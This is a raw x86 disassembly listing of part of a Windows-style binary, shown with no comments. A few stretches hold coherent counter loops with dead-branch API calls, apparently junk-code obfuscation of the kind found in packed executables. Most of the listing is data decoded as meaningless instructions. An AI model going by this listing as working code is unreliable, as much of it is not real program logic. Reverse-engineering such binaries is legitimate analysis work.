  4082f3:	jno    0x408327
  4082f5:	leave  
  4082f6:	mov    ch,0x5e
  4082f8:	xchg   ecx,eax
  4082f9:	adc    cl,bh
  4082fb:	sbb    al,0x60
  4082fd:	jnp    0x40829d
  4082ff:	or     BYTE PTR [eax+0x21],bh
  408302:	cmp    eax,0x918c9b7d
  408307:	push   esp
  408308:	stos   DWORD PTR es:[edi],eax
  408309:	stos   DWORD PTR es:[edi],eax
  40830a:	aad    0x26
  40830c:	stos   BYTE PTR es:[edi],al
  40830d:	(bad)  
  40830e:	mov    ds:0x40d64c,eax
  408313:	mov    eax,DWORD PTR [ebp+0x8]
  408316:	mov    eax,DWORD PTR [eax]
  408318:	mov    ecx,DWORD PTR ds:0x40d64c
  40831e:	add    DWORD PTR [eax],ecx
  408320:	pop    esi
  408321:	pop    ebp
  408322:	ret    0x8
  408325:	push   ebp
  408326:	mov    ebp,esp
  408328:	sub    esp,0x58
  40832b:	and    DWORD PTR ds:0x4235db,0x0
  408335:	jmp    0x408347
  40833a:	mov    ecx,DWORD PTR ds:0x4235db
  408340:	inc    ecx
  408341:	mov    DWORD PTR ds:0x4235db,ecx
  408347:	cmp    DWORD PTR ds:0x4235db,0x1a
  40834e:	jae    0x408391
  408354:	cmp    DWORD PTR ds:0x4235db,0xb
  40835b:	jne    0x40836c
  408361:	push   0x561f
  408366:	call   DWORD PTR ds:0x40d36c
  40836c:	cmp    DWORD PTR ds:0x4235db,0xa
  408373:	jne    0x408386
  408379:	mov    ecx,DWORD PTR ds:0x4235db
  40837f:	inc    ecx
  408380:	mov    DWORD PTR ds:0x4235db,ecx
  408386:	jmp    0x40833a
  40838b:	inc    DWORD PTR ds:0x412370
  408391:	mov    ecx,DWORD PTR [ebp+0x8]
  408394:	and    DWORD PTR ds:0x417e55,0x0
  40839e:	jmp    0x4083b1
  4083a3:	xor    eax,eax
  4083a5:	or     eax,DWORD PTR ds:0x417e55
  4083ab:	inc    eax
  4083ac:	mov    ds:0x417e55,eax
  4083b1:	cmp    DWORD PTR ds:0x417e55,0x1f
  4083b8:	jae    0x4083df
  4083be:	cmp    DWORD PTR ds:0x417e55,0x21
  4083c5:	jne    0x4083d4
  4083cb:	push   DWORD PTR [ebp-0x14]
  4083ce:	call   DWORD PTR ds:0x40d008
  4083d4:	jmp    0x4083a3
  4083d9:	sub    DWORD PTR ds:0x4235db,edi
  4083df:	mov    eax,0x8a43
  4083e4:	sub    DWORD PTR ds:0x415101,0x2da0
  4083ee:	jmp    0x408517
  4083f3:	dec    ecx
  4083f4:	pushf  
  4083f5:	push   esp
  4083f6:	in     eax,dx
  4083f7:	imul   esp,ebp,0x9f63b859
  4083fd:	mov    DWORD PTR [esp+ebx*2+0x6175c713],ebp
  408404:	adc    al,0x7e
  408406:	jle    0x408412
  408408:	jg     0x408488
  40840a:	jle    0x4083d2
  40840c:	rol    BYTE PTR [esi],cl
  40840e:	fs pop ebx
  408410:	pop    esp
  408411:	cmp    al,0x2a
  408413:	xor    dh,BYTE PTR [ebx-0x19]
  408416:	stos   BYTE PTR es:[edi],al
  408417:	push   ebx
  408418:	cmp    BYTE PTR [edx+0x13],bl
  40841b:	fdivr  DWORD PTR [edi]
  40841d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40841e:	jp     0x408485
  408420:	or     ebp,DWORD PTR [ebp-0x47f68d66]
  408426:	add    eax,0x996285b0
  40842b:	cld    
  40842c:	or     BYTE PTR [ebx+0x4f0ae411],dh
  408432:	mov    al,0xb4
  408434:	sahf   
  408435:	lds    esi,FWORD PTR [ecx+0x20]
  408438:	inc    ebx
  408439:	jns    0x40842f
  40843b:	xor    al,0x8a
  40843d:	or     al,0xbb
  40843f:	mov    esp,DWORD PTR [edx+0x2c85a5ca]
  408445:	jge    0x408422
  408447:	or     eax,edi
  408449:	sub    esp,DWORD PTR [edx-0xf10d33]
  40844f:	sub    DWORD PTR [ebx*8-0x43e34c8e],ebp
  408456:	sub    DWORD PTR [eax-0x51],0x126f4316
  40845d:	aad    0x56
  40845f:	mov    al,ds:0x54d994bf
  408464:	aas    
  408465:	pop    ebp
  408466:	mov    dh,BYTE PTR [ecx+0x2e]
  408469:	sub    dl,BYTE PTR [ebx-0x23]
  40846c:	push   ebp
  40846d:	adc    BYTE PTR [ebx-0x29deca20],al
  408473:	and    edi,DWORD PTR [eax+0x473ece48]
  408479:	aas    
  40847a:	xchg   ebp,eax
  40847b:	test   DWORD PTR [edx-0x3c],edx
  40847e:	stos   BYTE PTR es:[edi],al
  40847f:	ja     0x408475
  408481:	in     al,0x3a
  408483:	sbb    edi,DWORD PTR [esi*1+0x13dbbba]
  40848a:	(bad)  
  40848b:	mov    dh,0x71
  40848d:	sti    
  40848e:	retw   0x52c1
  408492:	iret   
  408493:	pop    esp
  408494:	pushf  
  408495:	ficomp DWORD PTR [ebp+0x68e4c99c]
  40849b:	aaa    
  40849c:	daa    
  40849d:	fsubr  st,st(7)
  40849f:	pop    eax
  4084a0:	and    BYTE PTR [eax-0x54a394],dh
  4084a6:	mov    edx,0x8e68e753
  4084ab:	mov    ebx,0xb1750cee
  4084b0:	js     0x4084da
  4084b2:	test   al,0x78
  4084b4:	xor    al,0x53
  4084b6:	out    0xf2,eax
  4084b8:	fcmove st,st(1)
  4084ba:	xor    BYTE PTR [esi+ebp*2-0x3c],dl
  4084be:	mov    dh,0xeb
  4084c0:	arpl   WORD PTR [ebx-0x52e996ab],sp
  4084c6:	ins    BYTE PTR es:[edi],dx
  4084c7:	pop    eax
  4084c8:	and    eax,eax
  4084ca:	xchg   edx,eax
  4084cb:	push   eax
  4084cc:	in     al,0xcf
  4084ce:	test   al,0x18
  4084d0:	push   eax
  4084d1:	jg     0x408526
  4084d3:	mov    ebp,0xc1567b6c
  4084d8:	mov    bh,0xac
  4084da:	in     eax,0xb7
  4084dc:	ret    
  4084dd:	jbe    0x4084f4
  4084df:	in     al,dx
  4084e0:	or     ah,BYTE PTR [ecx-0x55f85a61]
  4084e6:	mov    edx,db6
  4084e9:	xor    ebp,DWORD PTR [esi+0x28]
  4084ec:	out    0x59,al
  4084ee:	push   ebp
  4084ef:	jnp    0x408540
  4084f1:	retf   0xb816
  4084f4:	or     eax,0xbbcd208a
  4084f9:	int3   
  4084fa:	inc    edi
  4084fb:	mov    DWORD PTR [ebx-0x30c8d853],ebx
  408501:	hlt    
  408502:	cld    
  408503:	inc    esp
  408504:	leave  
  408505:	or     dl,BYTE PTR [ecx+0x26]
  408508:	and    ebx,DWORD PTR [ecx+0x4d]
  40850b:	jmp    0x585d:0xe8610be9
  408512:	stos   BYTE PTR es:[edi],al
  408513:	fwait
  408514:	jns    0x40850f
  408516:	jp     0x40857e
  408518:	xor    eax,DWORD PTR [ecx+0x20]
  40851b:	mov    ecx,0x3b0a
  408520:	not    DWORD PTR ds:0x41abce
  408526:	add    ax,cx
  408529:	mov    ecx,DWORD PTR ds:0x417e49
  40852f:	or     ecx,DWORD PTR ds:0x412374
  408535:	mov    DWORD PTR ds:0x417e49,ecx
  40853b:	jmp    0x408664
  408540:	sub    cl,BYTE PTR [ebp-0x31]
  408543:	xchg   esp,eax
  408544:	jns    0x4084da
  408546:	jns    0x408589
  408548:	or     eax,0xe426a896
  40854d:	inc    ebp
  40854e:	push   edi
  40854f:	sar    BYTE PTR [ebp+0x2a],1
  408552:	jle    0x4085d2
  408554:	or     bh,BYTE PTR [edi+0x7e]
  408557:	jle    0x408500
  408559:	bnd call 0x15434db1
  40855f:	jmp    0xb77b:0xe14fb1e8
  408566:	push   ecx
  408567:	icebp  
  408568:	shr    DWORD PTR [edx],cl
  40856a:	cli    
  40856b:	cmp    cl,BYTE PTR [ebp-0x19]
  40856e:	in     eax,0x6d
  408570:	adc    BYTE PTR [ecx-0x2],0x21
  408574:	in     eax,dx
  408575:	scas   al,BYTE PTR es:[edi]
  408576:	cmp    eax,0x2061c1f5
  40857b:	or     ah,BYTE PTR [ecx-0x5d]
  40857e:	mov    edx,0x1863639f
  408583:	inc    ebp
  408584:	xor    DWORD PTR [eax+ebp*1+0x15],esp
  408588:	outs   dx,DWORD PTR ds:[esi]
  408589:	scas   al,BYTE PTR es:[edi]
  40858a:	popf   
  40858b:	mov    dl,0x80
  40858d:	fimul  DWORD PTR [edi-0x7a5cff10]
  408593:	mov    bl,0x4d
  408595:	and    ch,BYTE PTR [ebx]
  408597:	xchg   esp,eax
  408598:	repnz leave 
  40859a:	push   eax
  40859b:	(bad)  [eax+0x6752081d]
  4085a1:	rcl    BYTE PTR [ebp+0x66c331f4],cl
  4085a7:	stos   DWORD PTR es:[edi],eax
  4085a8:	push   ds
  4085a9:	and    edi,DWORD PTR [bp+si-0x80a]
  4085ae:	mov    edi,0x15a91549
  4085b3:	loopne 0x408541
  4085b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085b6:	ficomp WORD PTR [ebp+0x3beaa5ea]
  4085bc:	daa    
  4085bd:	(bad)  
  4085be:	add    al,0x1d
  4085c0:	pop    edi
  4085c1:	mov    cl,0x3d
  4085c3:	imul   edx,edx,0x36
  4085c6:	sub    BYTE PTR [esp+edx*8+0x781feec],cl
  4085cd:	out    0x8a,eax
  4085cf:	and    BYTE PTR [edi],dl
  4085d1:	in     al,0x97
  4085d3:	(bad)  fs:0x9b91ec1e
  4085da:	call   0x3486f34f
  4085df:	push   ebp
  4085e0:	outs   dx,DWORD PTR ds:[esi]
  4085e1:	lds    esi,FWORD PTR fs:[edi+0x178f310d]
  4085e8:	scas   al,BYTE PTR es:[edi]
  4085e9:	inc    esi
  4085ea:	sub    DWORD PTR [esi+ebx*4+0x1c8b32ec],edx
  4085f1:	lahf   
  4085f2:	xchg   ebp,eax
  4085f3:	mov    bh,0x23
  4085f5:	jae    0x408601
  4085f7:	jbe    0x4085ab
  4085f9:	dec    ecx
  4085fa:	cmp    DWORD PTR [eax],ecx
  4085fc:	xchg   DWORD PTR [edx+0x66],ebx
  4085ff:	loope  0x40865e
  408601:	sbb    DWORD PTR [ebx],edx
  408603:	mov    ch,bl
  408605:	mov    esp,0x271d1ce7
  40860a:	cld    
  40860b:	popa   
  40860c:	cmp    eax,0x33c19ca8
  408611:	cli    
  408612:	popf   
  408613:	inc    ecx
  408614:	cdq    
  408615:	jle    0x4085b2
  408617:	dec    edi
  408618:	sbb    al,0x0
  40861a:	dec    ebx
  40861b:	mov    ecx,0xba486eaa
  408620:	iretw  
  408622:	pop    esp
  408623:	loopne 0x40861f
  408625:	inc    esi
  408626:	aaa    
  408627:	fld    DWORD PTR [eax+0x73]
  40862a:	nop
  40862b:	ficomp DWORD PTR [ebp+0x795a2970]
  408631:	(bad)  
  408632:	out    0xa6,al
  408634:	mov    ds:0x3467ad23,eax
  408639:	out    dx,al
  40863a:	push   ss
  40863b:	fidiv  DWORD PTR [ebp+0x1860ca1d]
  408641:	fisub  WORD PTR [esi]
  408643:	and    DWORD PTR [ebx-0x7b],0x52
  408647:	mov    ecx,0x112507f7
  40864c:	push   cs
  40864d:	neg    BYTE PTR [edi+0x470bf0a6]
  408653:	dec    ebp
  408654:	add    eax,0x50924cf1
  408659:	push   ebp
  40865a:	stos   BYTE PTR es:[edi],al
  40865b:	scas   eax,DWORD PTR es:[edi]
  40865c:	sbb    al,0x6d
  40865e:	pop    eax
  40865f:	(bad)  
  408660:	lods   al,BYTE PTR ds:[esi]
  408661:	dec    eax
  408662:	in     eax,0x27
  408664:	movzx  eax,ax
  408667:	add    ecx,DWORD PTR ds:0x417e49
  40866d:	mov    DWORD PTR [ebp-0xc],eax
  408670:	mov    BYTE PTR [ebp-0x1],0x7f
  408674:	lea    eax,[ebp-0x1]
  408677:	and    DWORD PTR ds:0x4235d7,edx
  40867d:	mov    DWORD PTR [ebp-0x10],eax
  408680:	mov    DWORD PTR ds:0x41510d,0x1a
  40868a:	cmp    DWORD PTR ds:0x41510d,0x0
  408691:	je     0x4086bf
  408697:	cmp    DWORD PTR ds:0x41510d,0x25
  40869e:	jne    0x4086ad
  4086a4:	push   DWORD PTR [ebp-0x18]
  4086a7:	call   DWORD PTR ds:0x40d370
  4086ad:	mov    ecx,DWORD PTR ds:0x41510d
  4086b3:	dec    ecx
  4086b4:	mov    DWORD PTR ds:0x41510d,ecx
  4086ba:	jmp    0x40868a
  4086bf:	mov    al,BYTE PTR [ebp-0x1]
  4086c2:	and    DWORD PTR ds:0x4150fd,0x0
  4086cc:	mov    ecx,DWORD PTR ds:0x4150fd
  4086d2:	inc    ecx
  4086d3:	mov    DWORD PTR ds:0x4150fd,ecx
  4086d9:	cmp    DWORD PTR ds:0x4150fd,0x11
  4086e0:	jne    0x4086f1
  4086e6:	push   0x41ad87
  4086eb:	call   DWORD PTR ds:0x40d1e4
  4086f1:	cmp    DWORD PTR ds:0x4150fd,0x10
  4086f8:	jne    0x40870b
  4086fe:	mov    ecx,DWORD PTR ds:0x4150fd
  408704:	inc    ecx
  408705:	mov    DWORD PTR ds:0x4150fd,ecx
  40870b:	cmp    DWORD PTR ds:0x4150fd,0x1f
  408712:	jb     0x4086cc
  408718:	neg    ecx
  40871a:	mov    ecx,DWORD PTR [ebp-0x10]
  40871d:	xor    al,0x4a
  40871f:	or     DWORD PTR ds:0x41abe2,0x415105
  408729:	sub    al,0x34
  40872b:	mov    BYTE PTR [ecx],al
  40872d:	xor    ecx,ecx
  40872f:	jmp    0x408858
  408734:	adc    DWORD PTR [ebx+0xc],ebx
  408737:	(bad)  
  408738:	fs pop ecx
  40873a:	jmp    0x44b4d3b8
  40873f:	ficomp DWORD PTR [ebp-0x64]
  408742:	stc    
  408743:	mov    al,0x9
  408745:	sub    edi,DWORD PTR [esi+0x7e]
  408748:	or     bh,BYTE PTR [edi+0x7e]
  40874b:	jle    0x408735
  40874d:	and    eax,ebp
  40874f:	clc    
  408750:	add    esi,eax
  408752:	(bad)  
  408753:	sub    ch,dh
  408755:	jb     0x4086ef
  408757:	push   ds
  408758:	adc    dh,BYTE PTR [esi+0x6f]
  40875b:	xlat   BYTE PTR ds:[ebx]
  40875c:	ficom  DWORD PTR [ebx*4-0x2e62b8f5]
  408763:	sbb    ecx,DWORD PTR [edx]
  408765:	cmp    ebx,ecx
  408767:	clc    
  408768:	(bad)  
  408769:	pop    edx
  40876a:	mov    al,0x1c
  40876c:	push   ecx
  40876d:	rcl    DWORD PTR [ebx+0x7383d73a],cl
  408773:	test   al,0x27
  408775:	stos   BYTE PTR es:[edi],al
  408776:	enter  0x8164,0xdf
  40877a:	das    
  40877b:	lock dec esp
  40877d:	inc    eax
  40877e:	push   ss
  40877f:	pop    edx
  408780:	stos   BYTE PTR es:[edi],al
  408781:	fst    st(7)
  408783:	aaa    
  408784:	inc    ecx
  408785:	ficom  WORD PTR [edi+eiz*1-0x2f345332]
  40878c:	or     al,0x5f
  40878e:	mov    edx,0xf7b5e7ab
  408793:	shl    bh,cl
  408795:	das    
  408796:	test   BYTE PTR [eax],0x97
  408799:	jno    0x40875b
  40879b:	mov    ebp,0xc6528153
  4087a0:	push   es
  4087a1:	pop    ebp
  4087a2:	ds (bad) 
  4087a4:	fisubr DWORD PTR [ebx-0x8]
  4087a7:	ds (bad) 
  4087a9:	repnz mov ebx,0x1d4aa72e
  4087af:	out    0x91,eax
  4087b1:	jbe    0x408814
  4087b3:	pop    es
  4087b4:	sbb    esi,DWORD PTR [edi-0x1a]
  4087b7:	jmp    0x81db:0x967c7f9c
  4087be:	push   esp
  4087bf:	xor    dx,WORD PTR [edi-0x1c]
  4087c3:	aaa    
  4087c4:	out    0xc,eax
  4087c6:	fbld   TBYTE PTR [esi-0x78328b0b]
  4087cc:	jnp    0x408811
  4087ce:	mov    DWORD PTR [esi+0x6f604c3e],edx
  4087d4:	mov    dh,0x8e
  4087d6:	and    DWORD PTR [edi],0x5b
  4087d9:	mov    ah,0xd4
  4087db:	cmp    ch,BYTE PTR [esi]
  4087dd:	mov    BYTE PTR [ecx],dh
  4087df:	dec    eax
  4087e0:	leave  
  4087e1:	test   al,0x52
  4087e3:	mov    WORD PTR [esp+ebx*1+0x3556860a],?
  4087ea:	mov    esp,0x1c43533
  4087ef:	fbld   TBYTE PTR ds:0xb0225c53
  4087f5:	mov    esi,DWORD PTR [esi+0x13]
  4087f8:	xchg   edi,eax
  4087f9:	(bad)  
  4087fa:	mov    eax,0xe7da1e84
  4087ff:	jae    0x40880e
  408801:	in     al,dx
  408802:	enter  0x4afd,0x34
  408806:	sbb    edx,DWORD PTR [eax]
  408808:	or     al,0x8e
  40880a:	sti    
  40880b:	xor    bh,BYTE PTR [esi-0x1ec94744]
  408811:	popf   
  408812:	aaa    
  408813:	mov    edi,0xeba7d65b
  408818:	std    
  408819:	(bad)  
  40881b:	fst    DWORD PTR gs:[edi-0x49]
  40881f:	jmp    0x9d78:0xbc1ac529
  408826:	xor    al,0x89
  408828:	mov    ah,dl
  40882a:	sub    esp,DWORD PTR [eax]
  40882c:	ret    
  40882d:	jbe    0x4087e6
  40882f:	lods   al,BYTE PTR ds:[esi]
  408830:	sub    al,BYTE PTR [ebp+0x45]
  408833:	dec    eax
  408834:	mov    DWORD PTR [ebx],0x9c2fbdbd
  40883a:	gs ins BYTE PTR es:[edi],dx
  40883c:	add    DWORD PTR [ecx-0x5a],edx
  40883f:	mov    al,0xc1
  408841:	mov    ds:0x328ca863,al
  408846:	add    BYTE PTR [ecx+0x21],0x7d
  40884a:	pop    ss
  40884b:	iret   
  40884c:	cwde   
  40884d:	rol    DWORD PTR [ebx+0x6ce4acc7],cl
  408853:	leave  
  408854:	test   al,0x8a
  408856:	mov    dh,0xc0
  408858:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  40885f:	adc    DWORD PTR ds:0x412370,0x1786
  408869:	mov    DWORD PTR [ebp-0x10],0xf89c853b
  408870:	mov    eax,DWORD PTR [ebp-0x8]
  408873:	xor    ecx,ecx
  408875:	add    ecx,DWORD PTR ds:0x417e59
  40887b:	sbb    DWORD PTR ds:0x41abde,ecx
  408881:	mov    ecx,0x7510859
  408886:	add    DWORD PTR ds:0x41abe6,0x417e51
  408890:	push   esi
  408891:	and    DWORD PTR ds:0x417e59,0x0
  40889b:	mov    esi,DWORD PTR ds:0x417e59
  4088a1:	inc    esi
  4088a2:	mov    DWORD PTR ds:0x417e59,esi
  4088a8:	cmp    DWORD PTR ds:0x417e59,0x9
  4088af:	jne    0x4088f1
  4088b5:	push   0x41ad06
  4088ba:	push   DWORD PTR [ebp-0x10]
  4088bd:	push   DWORD PTR [ebp-0x14]
  4088c0:	push   0x6f38
  4088c5:	push   0x208a
  4088ca:	push   0x8fdb
  4088cf:	push   0x1d69
  4088d4:	push   DWORD PTR [ebp-0x20]
  4088d7:	push   0x57cc
  4088dc:	push   DWORD PTR [ebp-0x10]
  4088df:	push   DWORD PTR [ebp-0x28]
  4088e2:	push   DWORD PTR [ebp-0x24]
  4088e5:	push   DWORD PTR [ebp-0x28]
  4088e8:	push   DWORD PTR [ebp-0x1c]
  4088eb:	call   DWORD PTR ds:0x40d374
  4088f1:	cmp    DWORD PTR ds:0x417e59,0x8
  4088f8:	jne    0x40890d
  4088fe:	xor    esi,esi
  408900:	add    esi,DWORD PTR ds:0x417e59
  408906:	inc    esi
  408907:	mov    DWORD PTR ds:0x417e59,esi
  40890d:	cmp    DWORD PTR ds:0x417e59,0x13
  408914:	jb     0x40889b
  40891a:	xor    eax,ecx
  40891c:	mov    esi,0x32729f
  408921:	add    eax,esi
  408923:	jmp    0x408930
  408928:	mov    dl,BYTE PTR [ebp-0x1]
  40892b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40892f:	inc    eax
  408930:	cmp    eax,0x40
  408933:	jb     0x408928
  408939:	mov    edx,DWORD PTR [ebp-0x8]
  40893c:	mov    eax,DWORD PTR [ebp-0xc]
  40893f:	jmp    0x408a68
  408944:	sub    eax,0xb98f82f6
  408949:	fwait
  40894a:	and    DWORD PTR [eax+eax*1+0x4cd74167],edx
  408951:	xchg   DWORD PTR [edx+ebp*8+0x5],esp
  408955:	sub    BYTE PTR [esi+0x7e],bh
  408958:	or     bh,BYTE PTR [edi+0x7e]
  40895b:	jle    0x408942
  40895d:	jmp    0x103335a3
  408962:	or     dl,BYTE PTR [esi-0x5a]
  408965:	add    DWORD PTR [edi*8-0x4fd6eba8],eax
  40896c:	inc    eax
  40896d:	cmovnp esi,DWORD PTR [ecx+0x54]
  408971:	xor    BYTE PTR [eax],cl
  408973:	aad    0x54
  408975:	mov    dh,0xc9
  408977:	in     eax,0x29
  408979:	in     al,dx
  40897a:	fcomp  DWORD PTR [esi]
  40897c:	rol    DWORD PTR [ecx-0x52],cl
  40897f:	sbb    eax,0xea6a0a25
  408984:	or     al,0x43
  408986:	int3   
  408987:	lds    edx,FWORD PTR [ecx]
  408989:	loope  0x40894e
  40898b:	or     esi,eax
  40898d:	mov    bl,0x12
  40898f:	push   esi
  408991:	inc    eax
  408992:	sbb    bh,ch
  408994:	test   esp,esi
  408996:	cmp    ecx,DWORD PTR [eax-0x3067118e]
  40899c:	push   ecx
  40899d:	mov    eax,0x96ca5925
  4089a2:	dec    ebx
  4089a3:	and    dl,BYTE PTR [ebp-0x6ec3f846]
  4089a9:	jnp    0x4089ed
  4089ab:	fisttp QWORD PTR [edi+0x62]
  4089ae:	repz adc eax,0x23b5a130
  4089b4:	repz mov ds:0x1afcdff,al
  4089ba:	add    eax,0xe2d3ec00
  4089bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089c0:	fnstcw WORD PTR [edi-0x6b]
  4089c3:	push   edx
  4089c4:	jnp    0x4089a0
  4089c6:	mov    al,ds:0xb127d686
  4089cb:	xor    edx,ecx
  4089cd:	sbb    edi,ebx
  4089cf:	cmp    bl,BYTE PTR [edx+0x48]
  4089d2:	xchg   BYTE PTR [ebx+0x5e71ad0b],cl
  4089d8:	(bad)  [eax-0x66]
  4089db:	(bad)  
  4089dc:	xor    al,0xe8
  4089de:	adc    eax,0xf245199a
  4089e3:	add    BYTE PTR [esi],ch
  4089e5:	xchg   edi,eax
  4089e6:	aam    0x8d
  4089e8:	inc    eax
  4089e9:	test   dl,bh
  4089eb:	ins    BYTE PTR es:[edi],dx
  4089ec:	mov    ds:0x38d92af8,eax
  4089f1:	xor    BYTE PTR ds:0x59a929f5,al
  4089f7:	iret   
  4089f8:	idiv   BYTE PTR [edx+esi*1]
  4089fb:	jp     0x4089d2
  4089fd:	or     bl,BYTE PTR [edi-0x16fde454]
  408a03:	pop    eax
  408a04:	lods   al,BYTE PTR ds:[esi]
  408a06:	dec    esp
  408a07:	push   ss
  408a08:	fdiv   QWORD PTR [edx-0x62c11f21]
  408a0e:	stc    
  408a0f:	mov    edx,0x17ebb791
  408a14:	fsub   st(3),st
  408a16:	mov    al,ds:0x7fc51cae
  408a1b:	popf   
  408a1c:	clc    
  408a1d:	add    al,0x51
  408a1f:	jmp    0x4089ab
  408a21:	and    DWORD PTR [esi+0x72772b7a],ecx
  408a27:	mov    bl,0xe0
  408a29:	xchg   ecx,ecx
  408a2b:	jmp    0xd1ab:0x4c8e3eb1
  408a32:	push   es
  408a33:	push   edx
  408a34:	pop    ecx
  408a35:	mov    ecx,0xa7c3be31
  408a3a:	mov    edx,0xd8ede6e8
  408a3f:	das    
  408a40:	jb     0x408a73
  408a42:	je     0x408a39
  408a44:	loopne 0x408ac3
  408a46:	imul   BYTE PTR [eax+0x1f]
  408a49:	fwait
  408a4a:	imul   esp,DWORD PTR [ebx],0xadc5a109
  408a50:	mov    eax,ds:0x44fcf182
  408a55:	sub    DWORD PTR [esi+0x7406752f],ecx
  408a5b:	xor    al,0xf9
  408a5d:	daa    
  408a5e:	(bad)  
  408a5f:	jns    0x4089ec
  408a61:	gs mov cl,0xb
  408a64:	adc    esp,DWORD PTR [ebx+ebp*4+0x61]
  408a68:	xor    edx,ecx
  408a6a:	add    edx,esi
  408a6c:	cmp    edx,eax
  408a6e:	je     0x408d06
  408a74:	jmp    0x408b9d
  408a79:	xor    ecx,DWORD PTR [edx+ebx*1-0x14]
  408a7d:	cdq    
  408a7e:	js     0x408a69
  408a80:	popa   
  408a81:	cmp    ax,0xba8d
  408a85:	js     0x408a74
  408a87:	xor    esi,DWORD PTR [edx+0x11]
  408a8a:	sub    DWORD PTR [esi+0x7e],edi
  408a8d:	or     bh,BYTE PTR [edi+0x7e]
  408a90:	jle    0x408a86
  408a92:	outs   dx,DWORD PTR ds:[esi]
  408a93:	(bad)  
  408a94:	sahf   
  408a95:	cmp    BYTE PTR [esi-0x3c34eae4],ah
  408a9b:	mov    ebx,0x2cb8a689
  408aa0:	cmp    al,0xea
  408aa2:	pushf  
  408aa3:	aaa    
  408aa4:	pusha  
  408aa5:	sub    al,0x82
  408aa7:	add    bh,BYTE PTR [esp+ebp*4-0x73]
  408aab:	int3   
  408aac:	in     al,0x3a
  408aae:	jmp    0xa78a:0x76067eb5
  408ab5:	imul   eax,DWORD PTR cs:[eax+0x6a41629],0xf3d4ad0
  408ac0:	(bad)  
  408ac1:	jnp    0x408ab9
  408ac3:	push   edx
  408ac4:	and    al,0xb0
  408ac6:	push   edx
  408ac7:	sub    al,0x10
  408ac9:	loop   0x408ae8
  408acb:	fnstenv [ecx+eiz*8-0x1a2e6423]
  408ad2:	gs mov edi,0xfc599066
  408ad8:	jg     0x408a75
  408ada:	loopne 0x408ae2
  408adc:	stos   BYTE PTR es:[edi],al
  408add:	mov    bl,0x8c
  408adf:	int    0x1e
  408ae1:	(bad)  
  408ae2:	les    esi,FWORD PTR [edi]
  408ae4:	in     al,0xa9
  408ae6:	push   es
  408ae7:	xchg   ecx,eax
  408ae8:	jae    0x408ac2
  408aea:	mov    edx,0xe8a1c121
  408aef:	sub    eax,0x1ee96284
  408af4:	sub    al,dl
  408af6:	(bad)  
  408af7:	jle    0x408b10
  408af9:	cmp    al,0xdd
  408afb:	cdq    
  408afc:	add    ecx,ebx
  408afe:	popf   
  408aff:	call   DWORD PTR [edx]
  408b01:	aas    
  408b02:	and    eax,ebx
  408b04:	imul   edi,DWORD PTR [eax+0x5f],0xfffffff2
  408b08:	into   
  408b09:	push   ecx
  408b0a:	xchg   edi,eax
  408b0b:	in     eax,0x98
  408b0d:	sti    
  408b0e:	and    al,0x99
  408b10:	shr    bh,cl
  408b12:	xor    edi,DWORD PTR [ebx+edx*4+0x15fa72c0]
  408b19:	scas   al,BYTE PTR es:[edi]
  408b1a:	add    ch,cl
  408b1c:	inc    edi
  408b1d:	outs   dx,DWORD PTR ds:[esi]
  408b1e:	aaa    
  408b1f:	sub    DWORD PTR [eax+0x2c],edx
  408b22:	call   0x8044:0x59f3cf5
  408b29:	cmc    
  408b2a:	repnz shl esi,cl
  408b2d:	mov    esi,0x55f085a5
  408b32:	test   BYTE PTR ds:[eax],dh
  408b35:	inc    eax
  408b36:	popa   
  408b37:	stos   BYTE PTR es:[edi],al
  408b38:	and    BYTE PTR [edx-0x260f1418],al
  408b3e:	adc    BYTE PTR [ebp+0x495f09a2],ch
  408b44:	scas   al,BYTE PTR es:[edi]
  408b45:	nop
  408b46:	push   edx
  408b47:	fcomp  QWORD PTR [ebx-0x3aded295]
  408b4d:	jge    0x408b49
  408b4f:	repz mov bl,0x5
  408b52:	mov    ecx,0xa4779391
  408b57:	out    0xc2,eax
  408b59:	gs aas 
  408b5b:	bound  ebp,QWORD PTR [esi+0x27]
  408b5e:	mov    dl,0x52
  408b60:	pop    es
  408b61:	sub    eax,0x2b57557b
  408b66:	adc    edi,DWORD PTR [ebx+edx*2]
  408b69:	out    dx,al
  408b6a:	xor    al,0xe3
  408b6c:	mov    bl,0x58
  408b6e:	adc    al,0x72
  408b70:	call   0x6663:0x4138dd35
  408b77:	xchg   ecx,eax
  408b78:	not    dh
  408b7a:	cmc    
  408b7b:	add    ah,ah
  408b7d:	mov    ecx,0xc2ee6118
  408b82:	(bad)  
  408b83:	arpl   ax,bp
  408b85:	xchg   DWORD PTR [edx+0x32],esi
  408b88:	pop    ebx
  408b89:	repz pop esp
  408b8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b8c:	leave  
  408b8d:	aas    
  408b8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b8f:	jp     0x408bcb
  408b91:	cmp    esi,0xffffff99
  408b94:	inc    ebx
  408b95:	mov    esi,ss
  408b97:	mov    ebx,DWORD PTR [ecx]
  408b99:	call   0x8b57:0x5311ceb8
  408ba0:	jge    0x408baa
  408ba2:	mov    eax,0x8a43
  408ba7:	xor    ax,WORD PTR [edi+edx*4+0x2]
  408bac:	mov    edi,0x3b0a
  408bb1:	add    ax,di
  408bb4:	movzx  eax,ax
  408bb7:	mov    DWORD PTR [ebp-0x14],eax
  408bba:	mov    eax,DWORD PTR [ebp+0x8]
  408bbd:	jmp    0x408ce6
  408bc2:	(bad)  
  408bc3:	fcom   DWORD PTR [edx+eax*8]
  408bc6:	sub    dl,ah
  408bc8:	clc    
  408bc9:	fcomp  DWORD PTR [ebx-0xbec9643]
  408bcf:	scas   eax,DWORD PTR es:[edi]
  408bd0:	or     esi,DWORD PTR [ebp+ebp*1+0xa7e7e2e]
  408bd7:	jg     0x408c57
  408bd9:	jle    0x408c4b
  408bdb:	push   edx
  408bdc:	push   ebx
  408bdd:	pop    ebx
  408bde:	(bad)  
  408bdf:	push   esi
  408be0:	jno    0x408bd0
  408be2:	inc    ebp
  408be3:	int3   
  408be4:	retf   0xf9a0
  408be7:	fmul   DWORD PTR [ecx-0x1f]
  408bea:	xchg   edi,eax
  408beb:	repz xchg esi,eax
  408bed:	adc    al,0x24
  408bef:	xchg   ecx,eax
  408bf0:	ja     0x408c69
  408bf2:	cmp    eax,0x8e538b7
